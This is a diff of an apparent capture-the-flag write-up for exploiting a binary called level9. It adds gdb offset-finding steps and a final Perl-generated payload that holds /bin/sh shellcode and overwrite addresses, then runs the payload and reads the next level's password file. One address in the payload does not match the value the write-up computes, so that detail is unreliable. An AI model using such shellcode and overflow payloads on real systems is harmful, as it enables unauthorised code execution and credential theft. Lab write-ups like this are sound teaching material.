@@ -13,7 +13,7 @@ The clue that showd us the way is in the main :
     0x0804867c <+136>:	mov    eax,DWORD PTR [esp+0x10]     # Dereferencing multiple times
     0x08048680 <+140>:	mov    eax,DWORD PTR [eax]          #
     0x08048682 <+142>:	mov    edx,DWORD PTR [eax]          #
-    0x08048684 <+144>:	mov    eax,DWORD PTR [esp+0x14]     
+    0x08048684 <+144>:	mov    eax,DWORD PTR [esp+0x14]
     0x08048688 <+148>:	mov    DWORD PTR [esp+0x4],eax
     0x0804868c <+152>:	mov    eax,DWORD PTR [esp+0x10]
     0x08048690 <+156>:	mov    DWORD PTR [esp],eax
@@ -37,5 +37,34 @@ The payload:
     [shellcode][offset][address A to B][address B to shellcode]
 
     gdb> pattern_create 200
-    
+    gdb> b *0x0804867c
+    gdb> r "the pattern"
+    gdb> pattern_search
+    [EAX] --> offset 0 - size ~200  # before any deref
+    [ECX] --> offset 12 - size ~188
+    [EDX] --> offset 0 - size ~200
+    [EBX] --> offset 108 - size ~92
+    gdb> n
+    gdb> pattern_search
+    [EAX] --> offset 108 - size ~92 # after first deref, our first address will have to be there !!
+    [ECX] --> offset 12 - size ~188
+    [EDX] --> offset 0 - size ~200
+    [EBX] --> offset 108 - size ~92
 
+So we got the numbers !
+
+    A: 0x804a078 + 108 + 4 = 0x0804a07c
+    B: 0x804a078
+
+    [shellcode: 45 bytes][63 random bytes][0x0804a07c][0x804a078]
+
+Final payload :
+
+perl -e 'print
+  "\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd\x80\xe8\xdc\xff\xff\xff/bin/sh"
+  . "D"x63
+  . "\x7c\xa0\x04\x08\x0c\xa0\x04\x08"
+  ' > /tmp/payload
+
+./level9 `cat /tmp/payload`
+$ cat /home/user/bonus0/.pass
